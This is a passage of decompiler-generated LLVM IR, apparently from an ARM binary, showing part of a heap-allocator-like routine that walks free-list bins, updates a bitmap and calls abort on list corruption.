  %v3_1274c = inttoptr i32 %v2_1274c to i32*
  %v4_1274c = load i32, i32* %v3_1274c, align 4
  %v4_12750 = mul i32 %v1_12744, 8
  %v5_12750 = add i32 %v4_1274c, %v4_12750
  store i32 %v5_12750, i32* %r3.global-to-local, align 4
  %v1_12754 = add i32 %v5_12750, 44
  store i32 %v1_12754, i32* %ip.global-to-local, align 4
  %v1_12758 = add i32 %v5_12750, 52
  %v2_12758 = inttoptr i32 %v1_12758 to i32*
  %v3_12758 = load i32, i32* %v2_12758, align 4
  store i32 %v3_12758, i32* @lr, align 4
  %v9_1275c = icmp eq i32 %v3_12758, %v1_12754
  br i1 %v9_1275c, label %dec_label_pc_12798, label %dec_label_pc_12764

dec_label_pc_12764:                               ; preds = %dec_label_pc_12740
  %v1_12764 = add i32 %v5_12750, 56
  %v2_12764 = inttoptr i32 %v1_12764 to i32*
  %v3_12764 = load i32, i32* %v2_12764, align 4
  store i32 %v3_12764, i32* %r1.global-to-local, align 4
  %v1_12768 = add i32 %v3_12764, 4
  %v2_12768 = inttoptr i32 %v1_12768 to i32*
  %v3_12768 = load i32, i32* %v2_12768, align 4
  store i32 %v3_12768, i32* %r3.global-to-local, align 4
  %v0_1276c = load i32, i32* %r4.global-to-local, align 4
  %v3_1276c = icmp ult i32 %v0_1276c, %v3_12768
  br i1 %v3_1276c, label %.thread, label %dec_label_pc_12788.preheader

.thread:                                          ; preds = %dec_label_pc_12764
  store i32 %v1_12754, i32* @lr, align 4
  store i32 %v3_12764, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12798

dec_label_pc_12788.preheader:                     ; preds = %dec_label_pc_12764
  %v2_12774 = or i32 %v0_1276c, 1
  store i32 %v2_12774, i32* %r2.global-to-local, align 4
  %v1_12788182 = add i32 %v3_12758, 4
  %v2_12788183 = inttoptr i32 %v1_12788182 to i32*
  %v3_12788184 = load i32, i32* %v2_12788183, align 4
  store i32 %v3_12788184, i32* %r3.global-to-local, align 4
  %v3_1278c186 = icmp ult i32 %v2_12774, %v3_12788184
  br i1 %v3_1278c186, label %dec_label_pc_12784, label %dec_label_pc_12794

dec_label_pc_12784:                               ; preds = %dec_label_pc_12788.preheader, %dec_label_pc_12784
  %v0_12794187 = phi i32 [ %v3_12784, %dec_label_pc_12784 ], [ %v3_12758, %dec_label_pc_12788.preheader ]
  %v1_12784 = add i32 %v0_12794187, 8
  %v2_12784 = inttoptr i32 %v1_12784 to i32*
  %v3_12784 = load i32, i32* %v2_12784, align 4
  store i32 %v3_12784, i32* @lr, align 4
  %v1_12788 = add i32 %v3_12784, 4
  %v2_12788 = inttoptr i32 %v1_12788 to i32*
  %v3_12788 = load i32, i32* %v2_12788, align 4
  store i32 %v3_12788, i32* %r3.global-to-local, align 4
  %v3_1278c = icmp ult i32 %v2_12774, %v3_12788
  br i1 %v3_1278c, label %dec_label_pc_12784, label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %dec_label_pc_12784, %dec_label_pc_12788.preheader
  %v0_12794.lcssa = phi i32 [ %v3_12758, %dec_label_pc_12788.preheader ], [ %v3_12784, %dec_label_pc_12784 ]
  %v1_12794 = add i32 %v0_12794.lcssa, 12
  %v2_12794 = inttoptr i32 %v1_12794 to i32*
  %v3_12794 = load i32, i32* %v2_12794, align 4
  store i32 %v3_12794, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12798

dec_label_pc_12798:                               ; preds = %.thread, %dec_label_pc_12740, %dec_label_pc_12724, %dec_label_pc_12794
  %v0_127b8 = phi i32 [ %v1_12754, %dec_label_pc_12740 ], [ %v1_12734, %dec_label_pc_12724 ], [ %v3_12794, %dec_label_pc_12794 ], [ %v3_12764, %.thread ]
  %v0_127ac = phi i32 [ %v1_12744, %dec_label_pc_12740 ], [ %v3_1272c, %dec_label_pc_12724 ], [ %v1_12744, %dec_label_pc_12794 ], [ %v1_12744, %.thread ]
  %v1_1279c = phi i32 [ %v1_1274c, %dec_label_pc_12740 ], [ %v1_12728, %dec_label_pc_12724 ], [ %v1_1274c, %dec_label_pc_12794 ], [ %v1_1274c, %.thread ]
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r2.global-to-local, align 4
  %v2_1279c = add i32 %v1_1279c, ptrtoint (i32* @global_var_2223c.361 to i32)
  %v3_1279c = inttoptr i32 %v2_1279c to i32*
  %v4_1279c = load i32, i32* %v3_1279c, align 4
  %v3_127a0 = sdiv i32 %v0_127ac, 32
  store i32 %v3_127a0, i32* %r3.global-to-local, align 4
  %v4_127a4 = mul nsw i32 %v3_127a0, 4
  %v5_127a4 = add i32 %v4_1279c, %v4_127a4
  store i32 %v5_127a4, i32* %r1.global-to-local, align 4
  %v1_127a8 = add i32 %v5_127a4, 820
  %v2_127a8 = inttoptr i32 %v1_127a8 to i32*
  %v3_127a8 = load i32, i32* %v2_127a8, align 4
  %v1_127ac = urem i32 %v0_127ac, 32
  store i32 %v1_127ac, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_127b4 = shl i32 1, %v1_127ac
  %v8_127b4 = or i32 %v3_127a8, %v7_127b4
  store i32 %v8_127b4, i32* %r3.global-to-local, align 4
  %v1_127b8 = load i32, i32* @r6, align 4
  %v2_127b8 = add i32 %v1_127b8, 12
  %v3_127b8 = inttoptr i32 %v2_127b8 to i32*
  store i32 %v0_127b8, i32* %v3_127b8, align 4
  %v0_127bc = load i32, i32* @lr, align 4
  %v1_127bc = load i32, i32* @r6, align 4
  %v2_127bc = add i32 %v1_127bc, 8
  %v3_127bc = inttoptr i32 %v2_127bc to i32*
  store i32 %v0_127bc, i32* %v3_127bc, align 4
  %v0_127c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_127c0 = load i32, i32* %r1.global-to-local, align 4
  %v2_127c0 = add i32 %v1_127c0, 820
  %v3_127c0 = inttoptr i32 %v2_127c0 to i32*
  store i32 %v0_127c0, i32* %v3_127c0, align 4
  %v0_127c4 = load i32, i32* @r6, align 4
  %v1_127c4 = load i32, i32* @lr, align 4
  %v2_127c4 = add i32 %v1_127c4, 12
  %v3_127c4 = inttoptr i32 %v2_127c4 to i32*
  store i32 %v0_127c4, i32* %v3_127c4, align 4
  %v0_127c8 = load i32, i32* @r6, align 4
  %v1_127c8 = load i32, i32* %ip.global-to-local, align 4
  %v2_127c8 = add i32 %v1_127c8, 8
  %v3_127c8 = inttoptr i32 %v2_127c8 to i32*
  store i32 %v0_127c8, i32* %v3_127c8, align 4
  %v0_127e4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_127e4

dec_label_pc_127d0:                               ; preds = %dec_label_pc_12670, %dec_label_pc_12628, %dec_label_pc_12684
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r1.global-to-local, align 4
  %v4_127d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_127d8, i32* @sb, align 4
  %v0_127dc = load i32, i32* @sl, align 4
  %v1_127dc = add i32 %v0_127dc, 16
  store i32 %v1_127dc, i32* @fp, align 4
  %v1_127e0 = add i32 %v4_127d8, 52
  store i32 %v1_127e0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_127e4

dec_label_pc_127e4:                               ; preds = %dec_label_pc_12798, %dec_label_pc_127d0
  %v0_12704 = phi i32 [ %v0_127e4.pre, %dec_label_pc_12798 ], [ %v1_127e0, %dec_label_pc_127d0 ]
  %v1_127e4 = add i32 %v0_12704, 12
  %v2_127e4 = inttoptr i32 %v1_127e4 to i32*
  %v3_127e4 = load i32, i32* %v2_127e4, align 4
  store i32 %v3_127e4, i32* @r6, align 4
  %v9_127e8 = icmp eq i32 %v3_127e4, %v0_12704
  br i1 %v9_127e8, label %dec_label_pc_127f0, label %dec_label_pc_12698

dec_label_pc_127f0:                               ; preds = %dec_label_pc_127e4
  %v0_127f0 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_127f0, 256
  %v0_128a8.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_127f0.dec_label_pc_128a8_crit_edge, label %dec_label_pc_127f8

dec_label_pc_127f0.dec_label_pc_128a8_crit_edge:  ; preds = %dec_label_pc_127f0
  %.pre203 = mul i32 %v0_128a8.pre, 8
  br label %dec_label_pc_128a8

dec_label_pc_127f8:                               ; preds = %dec_label_pc_127f0
  %v4_127f8 = mul i32 %v0_128a8.pre, 8
  %v5_127f8 = add i32 %v4_127f8, %v0_12704
  store i32 %v5_127f8, i32* %r3.global-to-local, align 4
  %v1_127fc = add i32 %v5_127f8, -8
  store i32 %v1_127fc, i32* %r1.global-to-local, align 4
  %v1_12800 = add i32 %v5_127f8, 4
  %v2_12800 = inttoptr i32 %v1_12800 to i32*
  %storemerge.pre = load i32, i32* %v2_12800, align 4
  br label %dec_label_pc_128a0

dec_label_pc_12808:                               ; preds = %dec_label_pc_128a0
  %v1_12808 = add i32 %v1_12830, 4
  %v2_12808 = inttoptr i32 %v1_12808 to i32*
  %v3_12808 = load i32, i32* %v2_12808, align 4
  store i32 %v3_12808, i32* %r3.global-to-local, align 4
  %v1_1280c = and i32 %v3_12808, -4
  store i32 %v1_1280c, i32* %r2.global-to-local, align 4
  %v3_12810 = icmp ult i32 %v1_1280c, %v0_127f0
  %v1_12814 = add i32 %v1_12830, 12
  %v2_12814 = inttoptr i32 %v1_12814 to i32*
  %v3_12814 = load i32, i32* %v2_12814, align 4
  store i32 %v3_12814, i32* %r0.global-to-local, align 4
  br i1 %v3_12810, label %dec_label_pc_128a0, label %dec_label_pc_1281c

dec_label_pc_1281c:                               ; preds = %dec_label_pc_12808
  %v1_1281c = add i32 %v1_12830, 8
  %v2_1281c = inttoptr i32 %v1_1281c to i32*
  %v3_1281c = load i32, i32* %v2_1281c, align 4
  store i32 %v3_1281c, i32* %r1.global-to-local, align 4
  %v1_12820 = add i32 %v3_1281c, 12
  %v2_12820 = inttoptr i32 %v1_12820 to i32*
  %v3_12820 = load i32, i32* %v2_12820, align 4
  store i32 %v3_12820, i32* %r3.global-to-local, align 4
  %v9_12824 = icmp eq i32 %v3_12820, %v1_12830
  br i1 %v9_12824, label %dec_label_pc_1282c, label %dec_label_pc_12838

dec_label_pc_1282c:                               ; preds = %dec_label_pc_1281c
  %v1_1282c = add i32 %v3_12814, 8
  %v2_1282c = inttoptr i32 %v1_1282c to i32*
  %v3_1282c = load i32, i32* %v2_1282c, align 4
  store i32 %v3_1282c, i32* %r3.global-to-local, align 4
  %v9_12830 = icmp eq i32 %v3_1282c, %v1_12830
  br i1 %v9_12830, label %dec_label_pc_1283c, label %dec_label_pc_12838

dec_label_pc_12838:                               ; preds = %dec_label_pc_1281c, %dec_label_pc_1282c
  %v0_12838 = call i32 @abort()
  store i32 %v0_12838, i32* %r0.global-to-local, align 4
  %v0_1283c.pre = load i32, i32* @sl, align 4
  %v1_1283c.pre = load i32, i32* @r2, align 4
  %v0_12844.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1283c

dec_label_pc_1283c:                               ; preds = %dec_label_pc_1282c, %dec_label_pc_12838
  %v1_12844 = phi i32 [ %v3_12814, %dec_label_pc_1282c ], [ %v0_12838, %dec_label_pc_12838 ]
  %v0_12844 = phi i32 [ %v3_1281c, %dec_label_pc_1282c ], [ %v0_12844.pre, %dec_label_pc_12838 ]
  %v1_1283c = phi i32 [ %v1_1280c, %dec_label_pc_1282c ], [ %v1_1283c.pre, %dec_label_pc_12838 ]
  %v0_1283c = phi i32 [ %v0_127f0, %dec_label_pc_1282c ], [ %v0_1283c.pre, %dec_label_pc_12838 ]
  %v2_1283c = sub i32 %v1_1283c, %v0_1283c
  store i32 %v2_1283c, i32* %lr.global-to-local, align 4
  %v2_12844 = add i32 %v1_12844, 8
  %v3_12844 = inttoptr i32 %v2_12844 to i32*
  store i32 %v0_12844, i32* %v3_12844, align 4
  %v0_12848 = load i32, i32* %r0.global-to-local, align 4
  %v1_12848 = load i32, i32* %r1.global-to-local, align 4
  %v2_12848 = add i32 %v1_12848, 12
  %v3_12848 = inttoptr i32 %v2_12848 to i32*
  store i32 %v0_12848, i32* %v3_12848, align 4
  %v0_1284c = load i32, i32* %ip.global-to-local, align 4
  %v1_1284c = add i32 %v0_1284c, 8
  store i32 %v1_1284c, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_1283c, 15
  br i1 %tmp210, label %dec_label_pc_1286c, label %dec_label_pc_12854

dec_label_pc_12854:                               ; preds = %dec_label_pc_1283c
  %v1_12854 = load i32, i32* %r2.global-to-local, align 4
  %v2_12854 = add i32 %v1_12854, %v0_1284c
  store i32 %v2_12854, i32* %r2.global-to-local, align 4
  %v1_12858 = add i32 %v2_12854, 4
  %v2_12858 = inttoptr i32 %v1_12858 to i32*
  %v3_12858 = load i32, i32* %v2_12858, align 4
  store i32 %v3_12858, i32* %r3.global-to-local, align 4
  store i32 %v1_1284c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12860

dec_label_pc_12860.loopexit:                      ; preds = %dec_label_pc_12700
  %v1_1270c = load i32, i32* @r6, align 4
  %v2_1270c = load i32, i32* @sl, align 4
  %v3_1270c = add i32 %v2_1270c, %v1_1270c
  store i32 %v3_1270c, i32* %r2.global-to-local, align 4
  %v2_12710 = add i32 %v3_1270c, 4
  %v3_12710 = inttoptr i32 %v2_12710 to i32*
  %v4_12710 = load i32, i32* %v3_12710, align 4
  store i32 %v4_12710, i32* %r3.global-to-local, align 4
  %v2_12714 = add i32 %v1_1270c, 8
  store i32 %v2_12714, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12860

dec_label_pc_12860:                               ; preds = %.dec_label_pc_12860_crit_edge, %dec_label_pc_12860.loopexit, %dec_label_pc_12854
  %v1_12864 = phi i32 [ %v4_12988, %.dec_label_pc_12860_crit_edge ], [ %v3_1270c, %dec_label_pc_12860.loopexit ], [ %v2_12854, %dec_label_pc_12854 ]
  %v0_12860 = phi i32 [ %v7_12988, %.dec_label_pc_12860_crit_edge ], [ %v4_12710, %dec_label_pc_12860.loopexit ], [ %v3_12858, %dec_label_pc_12854 ]
  %v1_12860 = or i32 %v0_12860, 1
  store i32 %v1_12860, i32* %r3.global-to-local, align 4
  %v2_12864 = add i32 %v1_12864, 4
  %v3_12864 = inttoptr i32 %v2_12864 to i32*
  store i32 %v1_12860, i32* %v3_12864, align 4
  br label %dec_label_pc_12e28

dec_label_pc_1286c:                               ; preds = %dec_label_pc_1283c
  %v1_1286c = load i32, i32* @sl, align 4
  %v2_1286c = add i32 %v1_1286c, %v0_1284c
  store i32 %v2_1286c, i32* %r2.global-to-local, align 4
  %v1_12870 = or i32 %v1_1286c, 1
  store i32 %v1_12870, i32* %r3.global-to-local, align 4
  %v0_12874 = load i32, i32* %lr.global-to-local, align 4
  %v1_12874 = or i32 %v0_12874, 1
  store i32 %v1_12874, i32* %r1.global-to-local, align 4
  store i32 %v1_1284c, i32* %r4.global-to-local, align 4
  %v2_1287c = add i32 %v0_1284c, 4
  %v3_1287c = inttoptr i32 %v2_1287c to i32*
  store i32 %v1_12870, i32* %v3_1287c, align 4
  %v0_12880 = load i32, i32* %r2.global-to-local, align 4
  %v1_12880 = load i32, i32* @r6, align 4
  %v2_12880 = add i32 %v1_12880, 8
  %v3_12880 = inttoptr i32 %v2_12880 to i32*
  store i32 %v0_12880, i32* %v3_12880, align 4
  %v0_12884 = load i32, i32* %r2.global-to-local, align 4
  %v1_12884 = load i32, i32* @r6, align 4
  %v2_12884 = add i32 %v1_12884, 12
  %v3_12884 = inttoptr i32 %v2_12884 to i32*
  store i32 %v0_12884, i32* %v3_12884, align 4
  %v0_12888 = load i32, i32* %lr.global-to-local, align 4
  %v1_12888 = load i32, i32* %r2.global-to-local, align 4
  %v3_12888 = add i32 %v1_12888, %v0_12888
  %v4_12888 = inttoptr i32 %v3_12888 to i32*
  store i32 %v0_12888, i32* %v4_12888, align 4
  %v0_1288c = load i32, i32* %r1.global-to-local, align 4
  %v1_1288c = load i32, i32* %r2.global-to-local, align 4
  %v2_1288c = add i32 %v1_1288c, 4
  %v3_1288c = inttoptr i32 %v2_1288c to i32*
  store i32 %v0_1288c, i32* %v3_1288c, align 4
  %v0_12890 = load i32, i32* @r6, align 4
  %v1_12890 = load i32, i32* %r2.global-to-local, align 4
  %v2_12890 = add i32 %v1_12890, 12
  %v3_12890 = inttoptr i32 %v2_12890 to i32*
  store i32 %v0_12890, i32* %v3_12890, align 4
  %v0_12894 = load i32, i32* @r6, align 4
  %v1_12894 = load i32, i32* %r2.global-to-local, align 4
  %v2_12894 = add i32 %v1_12894, 8
  %v3_12894 = inttoptr i32 %v2_12894 to i32*
  store i32 %v0_12894, i32* %v3_12894, align 4
  br label %dec_label_pc_12e28

dec_label_pc_128a0:                               ; preds = %dec_label_pc_12808, %dec_label_pc_127f8
  %v1_12830 = phi i32 [ %storemerge.pre, %dec_label_pc_127f8 ], [ %v3_12814, %dec_label_pc_12808 ]
  store i32 %v1_12830, i32* %ip.global-to-local, align 4
  %v9_128a0 = icmp eq i32 %v1_12830, %v1_127fc
  br i1 %v9_128a0, label %dec_label_pc_128a8.loopexit, label %dec_label_pc_12808

dec_label_pc_128a8.loopexit:                      ; preds = %dec_label_pc_128a0
  br label %dec_label_pc_128a8

dec_label_pc_128a8:                               ; preds = %dec_label_pc_127f0.dec_label_pc_128a8_crit_edge, %dec_label_pc_128a8.loopexit
  %v4_128d8.pre-phi = phi i32 [ %.pre203, %dec_label_pc_127f0.dec_label_pc_128a8_crit_edge ], [ %v4_127f8, %dec_label_pc_128a8.loopexit ]
  %v1_128a8 = add i32 %v0_128a8.pre, 1
  store i32 %v1_128a8, i32* %r2.global-to-local, align 4
  %v1_128ac = urem i32 %v1_128a8, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r0.global-to-local, align 4
  %v6_128b8 = shl i32 1, %v1_128ac
  store i32 %v6_128b8, i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_128c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32 64) to i32*), align 4
  store i32 %v4_128c0, i32* %r3.global-to-local, align 4
  %v3_128c4 = udiv i32 %v1_128a8, 32
  store i32 %v3_128c4, i32* @r5, align 4
  %v4_128c8 = mul nuw nsw i32 %v3_128c4, 4
  %v5_128c8 = add i32 %v4_128c0, %v4_128c8
  store i32 %v5_128c8, i32* %r2.global-to-local, align 4
  %v1_128cc = add i32 %v5_128c8, 820
  %v2_128cc = inttoptr i32 %v1_128cc to i32*
  %v3_128cc = load i32, i32* %v2_128cc, align 4
  store i32 %v3_128cc, i32* @r4, align 4
  %v1_128d0 = add i32 %v4_128c0, 52
  store i32 %v1_128d0, i32* %r3.global-to-local, align 4
  store i32 64, i32* @r8, align 4
  %v5_128d8 = add i32 %v1_128d0, %v4_128d8.pre-phi
  store i32 %v5_128d8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_128dc

dec_label_pc_128dc:                               ; preds = %dec_label_pc_12944, %dec_label_pc_128a8
  %v1_128e4 = phi i32 [ %v1_128e4.pre, %dec_label_pc_12944 ], [ %v3_128cc, %dec_label_pc_128a8 ]
  %v0_128e4 = phi i32 [ %v0_128dc.pre, %dec_label_pc_12944 ], [ %v6_128b8, %dec_label_pc_128a8 ]
  %v1_128dc = sub i32 1, %v0_128e4
  %v2_128dc = icmp ult i32 %v0_128e4, 2
  %v1_128dc. = select i1 %v2_128dc, i32 %v1_128dc, i32 0
  store i32 %v1_128dc., i32* %r3.global-to-local, align 4
  %tmp144 = icmp ugt i32 %v0_128e4, %v1_128e4
  br i1 %tmp144, label %.thread15, label %bb145

.thread15:                                        ; preds = %dec_label_pc_128dc
  %v5_128e8 = or i32 %v1_128dc., 1
  store i32 %v5_128e8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_128f4.preheader

bb145:                                            ; preds = %dec_label_pc_128dc
  %v2_128ec = icmp eq i32 %v1_128dc., 0
  br i1 %v2_128ec, label %.dec_label_pc_12930.preheader_crit_edge, label %dec_label_pc_128f4.preheader

.dec_label_pc_12930.preheader_crit_edge:          ; preds = %bb145
  %v0_1292857.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12930.preheader

dec_label_pc_128f4.preheader:                     ; preds = %bb145, %.thread15
  %v0_128f4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_128f4

dec_label_pc_128f4:                               ; preds = %dec_label_pc_128f4.preheader, %dec_label_pc_12900
  %v0_128f4 = phi i32 [ %v0_128f4.pre, %dec_label_pc_128f4.preheader ], [ %v1_128f4, %dec_label_pc_12900 ]
  %v1_128f4 = add i32 %v0_128f4, 1
  store i32 %v1_128f4, i32* @r5, align 4
  %tmp211 = icmp ugt i32 %v1_128f4, 2
  br i1 %tmp211, label %dec_label_pc_129d4.loopexit, label %dec_label_pc_12900

dec_label_pc_12900:                               ; preds = %dec_label_pc_128f4
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r3.global-to-local, align 4
  %v1_12904 = load i32, i32* @r8, align 4
  %v2_12904 = add i32 %v1_12904, ptrtoint (i32* @global_var_2223c.361 to i32)
  %v3_12904 = inttoptr i32 %v2_12904 to i32*
  %v4_12904 = load i32, i32* %v3_12904, align 4
  store i32 %v4_12904, i32* %r2.global-to-local, align 4
  %v4_12908 = mul i32 %v1_128f4, 4
  %v5_12908 = add i32 %v4_12904, %v4_12908
  store i32 %v5_12908, i32* %r3.global-to-local, align 4
  %v1_1290c = add i32 %v5_12908, 820
  %v2_1290c = inttoptr i32 %v1_1290c to i32*
  %v3_1290c = load i32, i32* %v2_1290c, align 4
  store i32 %v3_1290c, i32* @r4, align 4
  %v2_12910 = icmp eq i32 %v3_1290c, 0
  br i1 %v2_12910, label %dec_label_pc_128f4, label %dec_label_pc_12918

dec_label_pc_12918:                               ; preds = %dec_label_pc_12900
  %v4_12918 = mul i32 %v1_128f4, 256
  %v5_12918 = add i32 %v4_12904, %v4_12918
  store i32 %v5_12918, i32* %r3.global-to-local, align 4
  %v1_1291c = add i32 %v5_12918, 44
  store i32 %v1_1291c, i32* %r0.global-to-local, align 4
  %v0_12920 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_12920, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12930.preheader

dec_label_pc_12930.preheader:                     ; preds = %.dec_label_pc_12930.preheader_crit_edge, %dec_label_pc_12918
  %v0_1292857 = phi i32 [ %v1_1291c, %dec_label_pc_12918 ], [ %v0_1292857.pre, %.dec_label_pc_12930.preheader_crit_edge ]
  %v0_1294c = phi i32 [ %v3_1290c, %dec_label_pc_12918 ], [ %v1_128e4, %.dec_label_pc_12930.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_12920, %dec_label_pc_12918 ], [ %v0_128e4, %.dec_label_pc_12930.preheader_crit_edge ]
  %v2_1293054 = and i32 %ip.promoted, %v0_1294c
  %v4_1293056 = icmp eq i32 %v2_1293054, 0
  br i1 %v4_1293056, label %dec_label_pc_12928, label %dec_label_pc_12938

dec_label_pc_12928:                               ; preds = %dec_label_pc_12930.preheader, %dec_label_pc_12928
  %v2_1292c59 = phi i32 [ %v2_1292c, %dec_label_pc_12928 ], [ %ip.promoted, %dec_label_pc_12930.preheader ]
  %v0_1292858 = phi i32 [ %v1_12928, %dec_label_pc_12928 ], [ %v0_1292857, %dec_label_pc_12930.preheader ]
  %v1_12928 = add i32 %v0_1292858, 8
  %v2_1292c = mul i32 %v2_1292c59, 2
  %v2_12930 = and i32 %v2_1292c, %v0_1294c
  %v4_12930 = icmp eq i32 %v2_12930, 0
  br i1 %v4_12930, label %dec_label_pc_12928, label %dec_label_pc_12930.dec_label_pc_12938_crit_edge

dec_label_pc_12930.dec_label_pc_12938_crit_edge:  ; preds = %dec_label_pc_12928
  store i32 %v1_12928, i32* %r0.global-to-local, align 4
  store i32 %v2_1292c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12938

dec_label_pc_12938:                               ; preds = %dec_label_pc_12930.dec_label_pc_12938_crit_edge, %dec_label_pc_12930.preheader
  %v0_12958 = phi i32 [ %v2_1292c, %dec_label_pc_12930.dec_label_pc_12938_crit_edge ], [ %ip.promoted, %dec_label_pc_12930.preheader ]
  %v0_1297c = phi i32 [ %v1_12928, %dec_label_pc_12930.dec_label_pc_12938_crit_edge ], [ %v0_1292857, %dec_label_pc_12930.preheader ]
  %v1_12938 = add i32 %v0_1297c, 12
  %v2_12938 = inttoptr i32 %v1_12938 to i32*
  %v3_12938 = load i32, i32* %v2_12938, align 4
  store i32 %v3_12938, i32* @lr, align 4
  %v9_1293c = icmp eq i32 %v3_12938, %v0_1297c
  br i1 %v9_1293c, label %dec_label_pc_12944, label %dec_label_pc_12964

dec_label_pc_12944:                               ; preds = %dec_label_pc_12938
  store i32 ptrtoint (i32* @global_var_2223c.361 to i32), i32* %r0.global-to-local, align 4
  %v1_12948 = load i32, i32* @r8, align 4
  %v2_12948 = add i32 %v1_12948, ptrtoint (i32* @global_var_2223c.361 to i32)
  %v3_12948 = inttoptr i32 %v2_12948 to i32*
  %v4_12948 = load i32, i32* %v3_12948, align 4
  %v2_1294c = sub i32 -1, %v0_12958
  %v3_1294c = and i32 %v0_1294c, %v2_1294c
  store i32 %v3_1294c, i32* @r4, align 4
  %v1_12950 = load i32, i32* @r5, align 4
  %v4_12950 = mul i32 %v1_12950, 4
  %v5_12950 = add i32 %v4_12950, %v4_12948
  store i32 %v5_12950, i32* %r3.global-to-local, align 4
  %v1_12954 = add i32 %v0_1297c, 8
  store i32 %v1_12954, i32* %r0.global-to-local, align 4
  %v2_12958 = mul i32 %v0_12958, 2
  store i32 %v2_12958, i32* %ip.global-to-local, align 4
  %v2_1295c = add i32 %v5_12950, 820
  %v3_1295c = inttoptr i32 %v2_1295c to i32*
  store i32 %v3_1294c, i32* %v3_1295c, align 4
  %v0_128dc.pre = load i32, i32* %ip.global-to-local, align 4
  %v1_128e4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_128dc

dec_label_pc_12964:                               ; preds = %dec_label_pc_12938
  %v1_12964 = add i32 %v3_12938, 4
  %v2_12964 = inttoptr i32 %v1_12964 to i32*
  %v3_12964 = load i32, i32* %v2_12964, align 4
  store i32 %v3_12964, i32* %r3.global-to-local, align 4
  %v1_12968 = and i32 %v3_12964, -4
  store i32 %v1_12968, i32* %r2.global-to-local, align 4
  %v0_1296c = load i32, i32* @sl, align 4
  %v2_1296c = sub i32 %v1_12968, %v0_1296c
  store i32 %v2_1296c, i32* %ip.global-to-local, align 4
  %v1_12970 = add i32 %v3_12938, 12
  %v2_12970 = inttoptr i32 %v1_12970 to i32*
  %v3_12970 = load i32, i32* %v2_12970, align 4
  store i32 %v3_12970, i32* %r3.global-to-local, align 4
  %tmp212 = icmp ult i32 %v2_1296c, 16
  br i1 %tmp212, label %bb146, label %bb147

bb146:                                            ; preds = %dec_label_pc_12964
  %v6_12978 = add i32 %v1_12968, %v3_12938
  store i32 %v6_12978, i32* %r2.global-to-local, align 4
  br label %bb147

bb147:                                            ; preds = %dec_label_pc_12964, %bb146
  %v2_1297c = add i32 %v3_12970, 8
  %v3_1297c = inttoptr i32 %v2_1297c to i32*
  store i32 %v0_1297c, i32* %v3_1297c, align 4
  %v0_12980 = load i32, i32* %r3.global-to-local, align 4
  %v1_12980 = load i32, i32* %r0.global-to-local, align 4
  %v2_12980 = add i32 %v1_12980, 12
  %v3_12980 = inttoptr i32 %v2_12980 to i32*
  store i32 %v0_12980, i32* %v3_12980, align 4
  %v4_12984 = load i32, i32* @lr, align 4
  br i1 %tmp212, label %.dec_label_pc_12860_crit_edge, label %dec_label_pc_12990

.dec_label_pc_12860_crit_edge:                    ; preds = %bb147
  %v5_12984 = add i32 %v4_12984, 8
  store i32 %v5_12984, i32* %r4.global-to-local, align 4
  %v4_12988 = load i32, i32* %r2.global-to-local, align 4
  %v5_12988 = add i32 %v4_12988, 4
  %v6_12988 = inttoptr i32 %v5_12988 to i32*
  %v7_12988 = load i32, i32* %v6_12988, align 4
  store i32 %v7_12988, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_12860

dec_label_pc_12990:                               ; preds = %bb147
  %v1_12990 = load i32, i32* @sl, align 4
  %v2_12990 = add i32 %v1_12990, %v4_12984
  store i32 %v2_12990, i32* %r1.global-to-local, align 4
  %v1_12998 = load i32, i32* @r6, align 4
  %v2_12998 = add i32 %v1_12998, 8
  %v3_12998 = inttoptr i32 %v2_12998 to i32*
  store i32 %v2_12990, i32* %v3_12998, align 4
  %v0_1299c = load i32, i32* %r1.global-to-local, align 4
  %v1_1299c = load i32, i32* @r6, align 4
  %v2_1299c = add i32 %v1_1299c, 12
  %v3_1299c = inttoptr i32 %v2_1299c to i32*
  store i32 %v0_1299c, i32* %v3_1299c, align 4
  %v0_129a0 = load i32, i32* @r6, align 4
  %v1_129a0 = load i32, i32* %r1.global-to-local, align 4
  %v2_129a0 = add i32 %v1_129a0, 8
  %v3_129a0 = inttoptr i32 %v2_129a0 to i32*
  store i32 %v0_129a0, i32* %v3_129a0, align 4
  %v0_129a4 = load i32, i32* @r6, align 4
  %v1_129a4 = load i32, i32* %r1.global-to-local, align 4
  %v2_129a4 = add i32 %v1_129a4, 12
  %v3_129a4 = inttoptr i32 %v2_129a4 to i32*
  store i32 %v0_129a4, i32* %v3_129a4, align 4
  %tmp213 = icmp ult i32 %v1_12990, 256
  br i1 %tmp213, label %bb148, label %.thread124

